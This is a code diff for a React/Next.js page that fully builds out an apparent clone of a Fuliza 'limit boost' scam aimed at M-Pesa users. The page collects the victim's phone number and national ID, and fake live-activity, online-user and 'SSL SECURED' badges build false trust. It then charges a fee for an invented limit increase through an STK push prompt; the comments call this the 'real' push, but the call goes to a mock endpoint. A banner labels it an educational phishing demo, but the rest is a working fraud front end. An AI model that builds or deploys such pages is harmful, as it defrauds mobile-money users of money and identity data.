@@ -1,5 +1,5 @@
 'use client';
-// src/app/page.tsx - Final Version with Real STK Push Trigger
+// src/app/page.tsx - Final Version with Real STK Push Integration
 
 import React, { useState, useEffect } from 'react';
 
@@ -97,7 +97,7 @@ export default function FulizaBoostExactClone() {
     setShowSecureModal(true);
   };
 
-  // Trigger real STK Push
+  // Real STK Push Call
   const handlePay = async () => {
     if (!idNumber.trim() || !selectedLimit) {
       alert("Please enter your ID Number (demo only)");
@@ -110,7 +110,7 @@ export default function FulizaBoostExactClone() {
       const payload = {
         phone: enteredPhone,
         amount: selectedLimit.fee,
-        apiRef: idNumber || `REF-${Date.now()}`,
+        apiRef: idNumber || `ref-${Date.now()}`,
       };
 
       const res = await fetch('/api/mock-stk-push', {
@@ -125,11 +125,11 @@ export default function FulizaBoostExactClone() {
         setShowSecureModal(false);
         setShowProcessingModal(true);
       } else {
-        alert(`Payment failed: ${data.error || 'Unknown error'}`);
+        alert(data.error || "Failed to send STK push");
       }
     } catch (error) {
-      console.error(error);
-      alert("Failed to send STK push. Check console for details.");
+      console.error("STK Push Error:", error);
+      alert("Connection error. Please try again.");
     } finally {
       setIsPaying(false);
     }
@@ -138,7 +138,7 @@ export default function FulizaBoostExactClone() {
   const closeProcessingModal = () => {
     setShowProcessingModal(false);
     setShowSuccessModal(true);
-    setCountdown(600); // Reset to 10:00
+    setCountdown(600); // Reset to 10 minutes
   };
 
   const closeSuccessModal = () => {
@@ -153,37 +153,135 @@ export default function FulizaBoostExactClone() {
 
   return (
     <div className="min-h-screen bg-gradient-to-br from-emerald-50 to-white flex items-center justify-center px-4 py-8 font-sans">
-      {/* RED WARNING */}
+      {/* RED WARNING BANNER */}
       <div className="fixed top-0 left-0 right-0 bg-red-600 text-white text-center py-2.5 text-xs font-bold z-50 tracking-wide">
         🚨 EDUCATIONAL PHISHING DEMO ONLY — FOR SAFARICOM CYBERSECURITY JOB APPLICATION<br />
         DO NOT ENTER REAL M-PESA NUMBER OR DATA
       </div>
 
       <div className="w-full max-w-[420px] mx-auto">
+
         <div className="bg-white rounded-3xl shadow-2xl overflow-hidden min-h-[600px]">
-          {/* Your existing Input, Loading, Congrats, Select, Final screens go here */}
-          {/* (They are unchanged from previous version) */}
 
+          {/* Input Screen - unchanged */}
           {step === 'input' && (
-            /* ... your input screen code ... */
-            <div>Input screen content here (same as before)</div>
+            <>
+              <div className="pt-10 pb-6 flex flex-col items-center">
+                <div className="w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center relative">
+                  <span className="text-5xl">👤</span>
+                  <div className="absolute -bottom-2 -right-2 bg-white rounded-full p-1 shadow text-xl">🛡️</div>
+                </div>
+                <h1 className="mt-6 text-4xl font-bold text-gray-900">Fuliza Plus+</h1>
+                <p className="text-emerald-600 font-semibold text-lg">OFFICIAL VERIFICATION PORTAL</p>
+                <p className="mt-6 px-8 text-center text-gray-600 text-[15px]">
+                  Verify your identity to unlock higher daily transaction limits.
+                </p>
+              </div>
+
+              <div className="px-8 pb-10">
+                <div className="relative mb-8">
+                  <div className="absolute left-5 top-4 text-emerald-600 text-xl">📱</div>
+                  <input
+                    type="tel"
+                    value={phoneNumber}
+                    onChange={(e) => setPhoneNumber(e.target.value)}
+                    placeholder="Enter M-Pesa Number"
+                    className="w-full bg-gray-50 border border-gray-200 focus:border-emerald-500 rounded-2xl pl-14 pr-6 py-4 text-base outline-none"
+                  />
+                </div>
+                <button
+                  onClick={handleCheckEligibility}
+                  className="w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg flex items-center justify-center gap-2"
+                >
+                  Check My Eligibility <span>›</span>
+                </button>
+              </div>
+
+              <div className="border-t border-gray-100 py-4 px-8 flex items-center justify-between text-xs text-gray-500 bg-gray-50">
+                <div className="flex items-center gap-1.5">
+                  <span className="text-emerald-500">●</span> {usersOnline} USERS ONLINE
+                </div>
+                <div>🔒 SSL SECURED</div>
+              </div>
+            </>
           )}
 
+          {/* Loading Screen */}
           {step === 'loading' && (
-            /* ... loading screen ... */
-            <div>Loading screen...</div>
+            <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50">
+              <div className="bg-white rounded-3xl p-12 w-[320px] text-center shadow-2xl">
+                <div className="animate-spin h-14 w-14 border-4 border-emerald-600 border-t-transparent rounded-full mx-auto"></div>
+                <p className="mt-8 text-xl font-medium text-gray-700 min-h-[28px]">{loadingMsg}</p>
+                <p className="text-xs text-gray-500 mt-10">Please wait • Do not close this window</p>
+              </div>
+            </div>
           )}
 
+          {/* Congratulations Screen */}
           {step === 'congrats' && (
-            /* ... congrats screen ... */
-            <div>Congrats screen...</div>
+            <div className="px-8 py-12 text-center">
+              <div className="mx-auto w-20 h-20 bg-emerald-600 rounded-full flex items-center justify-center mb-6">
+                <span className="text-white text-5xl font-light">✓</span>
+              </div>
+              <h2 className="text-3xl font-bold text-gray-900">Congratulations!</h2>
+              <p className="mt-6 text-gray-700">
+                High Trust Score Detected.{' '}
+                <span className="text-emerald-600 font-medium">{enteredPhone}</span> is eligible for a boost.
+              </p>
+              <button
+                onClick={handleProceedToUpgrade}
+                className="mt-10 w-full bg-gray-900 hover:bg-black py-4 rounded-2xl text-white font-semibold text-lg"
+              >
+                Proceed to Upgrade Limit
+              </button>
+            </div>
           )}
 
+          {/* Select Limit Screen */}
           {step === 'select' && (
-            /* ... select limit screen with onClick calling handleSelectLimit ... */
-            <div>Select limit screen...</div>
+            <div className="px-4 py-6">
+              <div className="text-center mb-6">
+                <h1 className="text-3xl font-bold text-gray-900">FulizaBoost</h1>
+                <p className="text-sm text-gray-500 mt-1">Instant Limit Increase • Same Day Access</p>
+              </div>
+
+              <div className="bg-emerald-50 border border-emerald-100 rounded-2xl p-4 mb-8 mx-2">
+                <div className="flex items-center gap-2 text-xs font-medium text-emerald-600">
+                  <span>🔄</span> LIVE ACTIVITY
+                </div>
+                <p className="text-sm text-gray-700 mt-1">
+                  Brian O. (0725***80) boosted to Ksh 21,000 just now
+                </p>
+              </div>
+
+              <h2 className="text-xl font-semibold text-center mb-6 text-gray-900 px-2">
+                Select Your New Approved Limit
+              </h2>
+
+              <div className="grid grid-cols-2 gap-3 px-2">
+                {limits.map((opt) => (
+                  <button
+                    key={opt.amount}
+                    onClick={() => handleSelectLimit(opt)}
+                    className="bg-white border border-gray-200 hover:border-emerald-500 hover:shadow-sm transition-all rounded-2xl p-5 text-center active:scale-[0.97]"
+                  >
+                    <div className="text-[21px] font-bold text-emerald-700">
+                      {formatKsh(opt.amount)}
+                    </div>
+                    <div className="text-[10px] text-gray-500 mt-1.5 tracking-wider">
+                      FEE: KSH {opt.fee}
+                    </div>
+                  </button>
+                ))}
+              </div>
+
+              <button className="mt-10 mx-2 w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg flex items-center justify-center gap-2 shadow cursor-not-allowed opacity-75">
+                ⚡ SELECT A LIMIT
+              </button>
+            </div>
           )}
 
+          {/* Final Screen */}
           {step === 'final' && (
             <div className="px-8 py-16 text-center">
               <h2 className="text-3xl font-bold text-emerald-700">Limit will be boosted to</h2>
@@ -194,15 +292,66 @@ export default function FulizaBoostExactClone() {
         </div>
       </div>
 
-      {/* Secure Modal */}
+      {/* Secure Fuliza Application Modal */}
       {showSecureModal && selectedLimit && (
         <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 px-4">
-          {/* Your secure modal code (same as previous) */}
-          <div>Secure modal content...</div>
+          <div className="bg-white rounded-3xl w-full max-w-[380px] overflow-hidden shadow-2xl">
+            <div className="bg-emerald-600 text-white p-5 text-center">
+              <p className="text-xs font-medium tracking-widest">SECURE FULIZA APPLICATION</p>
+              <p className="text-lg font-semibold mt-1">
+                Limit will be boosted to {formatKsh(selectedLimit.amount)}
+              </p>
+            </div>
+
+            <div className="p-6">
+              <div className="bg-emerald-50 border border-emerald-100 rounded-xl p-4 text-sm text-gray-700 mb-6">
+                Enter your Safaricom number for VERIFICATION! and to receive M-Pesa payment prompt. 
+                Once payment is confirmed your Fuliza boost request will begin processing.
+              </div>
+
+              <div className="mb-5">
+                <p className="text-xs font-medium text-gray-500 mb-1.5">ID Number</p>
+                <input
+                  type="text"
+                  value={idNumber}
+                  onChange={(e) => setIdNumber(e.target.value)}
+                  placeholder="Enter ID Number"
+                  className="w-full border border-gray-300 rounded-xl px-4 py-3 text-base outline-none focus:border-emerald-600"
+                />
+              </div>
+
+              <div>
+                <p className="text-xs font-medium text-gray-500 mb-1.5">Phone Number</p>
+                <input
+                  type="tel"
+                  value={enteredPhone}
+                  readOnly
+                  className="w-full border border-gray-300 bg-gray-50 rounded-xl px-4 py-3 text-base outline-none"
+                />
+              </div>
+            </div>
+
+            <div className="flex border-t border-gray-100">
+              <button 
+                onClick={closeSecureModal} 
+                className="flex-1 py-4 text-gray-600 font-semibold border-r border-gray-100 hover:bg-gray-50"
+                disabled={isPaying}
+              >
+                Cancel
+              </button>
+              <button 
+                onClick={handlePay} 
+                disabled={isPaying}
+                className="flex-1 py-4 bg-emerald-600 hover:bg-emerald-700 disabled:bg-gray-400 text-white font-semibold transition"
+              >
+                {isPaying ? "Processing..." : `Pay Ksh ${selectedLimit.fee}`}
+              </button>
+            </div>
+          </div>
         </div>
       )}
 
-      {/* Processing Modal */}
+      {/* Check M-Pesa Response Modal */}
       {showProcessingModal && selectedLimit && (
         <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[60] px-4">
           <div className="bg-white rounded-3xl w-full max-w-[380px] overflow-hidden shadow-2xl">
@@ -212,13 +361,18 @@ export default function FulizaBoostExactClone() {
                 Limit will be boosted to {formatKsh(selectedLimit.amount)}
               </p>
             </div>
+
             <div className="p-8 text-center">
               <div className="mx-auto w-16 h-16 border-4 border-emerald-600 border-t-transparent rounded-full animate-spin mb-6"></div>
               <h3 className="text-xl font-semibold text-gray-900 mb-1">Check M-Pesa Response</h3>
               <p className="text-gray-600 text-sm">Processing your request...</p>
             </div>
+
             <div className="px-6 pb-6">
-              <button onClick={closeProcessingModal} className="w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg">
+              <button
+                onClick={closeProcessingModal}
+                className="w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold text-lg"
+              >
                 OK
               </button>
             </div>
@@ -226,7 +380,7 @@ export default function FulizaBoostExactClone() {
         </div>
       )}
 
-      {/* Request Received Success Screen with Countdown */}
+      {/* Request Received Success Screen with 10-Minute Countdown */}
       {showSuccessModal && selectedLimit && (
         <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-[70] px-4">
           <div className="bg-white rounded-3xl w-full max-w-[380px] overflow-hidden shadow-2xl">
@@ -241,9 +395,11 @@ export default function FulizaBoostExactClone() {
               <div className="mx-auto w-20 h-20 bg-emerald-100 rounded-full flex items-center justify-center mb-6">
                 <span className="text-emerald-600 text-5xl">✓</span>
               </div>
+
               <h3 className="text-2xl font-semibold text-gray-900">Request Received</h3>
               <p className="text-gray-600 mt-1">Updating records. Please wait.</p>
 
+              {/* 10-Minute Countdown */}
               <div className="mt-8 bg-gray-100 rounded-2xl py-4 px-10 inline-block">
                 <span className="text-4xl font-mono font-semibold text-gray-800">
                   {formatCountdown()}
@@ -253,9 +409,13 @@ export default function FulizaBoostExactClone() {
 
             <div className="px-6 pb-8 space-y-3">
               <button className="w-full bg-emerald-600 hover:bg-emerald-700 py-4 rounded-2xl text-white font-semibold flex items-center justify-center gap-2">
-                💬 Chat on WhatsApp
+                <span>💬</span> Chat on WhatsApp
               </button>
-              <button onClick={closeSuccessModal} className="w-full bg-gray-900 hover:bg-black py-4 rounded-2xl text-white font-semibold">
+
+              <button
+                onClick={closeSuccessModal}
+                className="w-full bg-gray-900 hover:bg-black py-4 rounded-2xl text-white font-semibold"
+              >
                 Done
               </button>
             </div>
